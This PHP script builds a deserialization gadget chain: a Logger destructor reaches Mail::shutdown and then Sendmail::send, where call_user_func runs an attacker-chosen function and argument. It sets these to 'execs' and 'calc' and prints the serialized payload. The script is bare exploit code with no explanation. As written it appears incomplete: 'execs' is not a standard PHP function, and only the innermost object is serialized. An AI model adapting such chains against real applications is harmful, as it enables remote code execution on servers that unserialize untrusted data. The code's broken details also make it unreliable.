<?php
class Logger 
{
    protected $writer;
    public function __destruct()
    {
        $this->writer->shutdown();
    }
}


class Mail
{
    protected $transport;
    public function shutdown()
    {
        $this->transport->send();
    }
}

class Sendmail{
    public $callable;
    public $to;
    public function send()
    {
        call_user_func($this->callable, $this->to);
    }
}

$abc = new Sendmail;
$abc -> callable ="execs";
$abc -> to = "calc";
echo serialize($abc);
?>